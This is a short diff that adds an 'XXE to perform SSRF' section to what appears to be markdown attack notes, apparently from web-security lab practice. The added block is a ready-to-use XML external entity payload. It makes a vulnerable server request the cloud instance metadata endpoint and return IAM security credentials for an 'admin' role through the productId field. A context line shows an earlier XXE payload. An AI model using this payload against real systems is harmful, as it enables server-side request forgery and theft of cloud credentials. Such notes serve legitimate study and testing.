@@ -6,3 +6,13 @@
 <stockCheck><productId>&xxe;</productId></stockCheck> 
 ```
 
+### XXE to perform SSRF
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck>
+  <productId>&xxe;</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
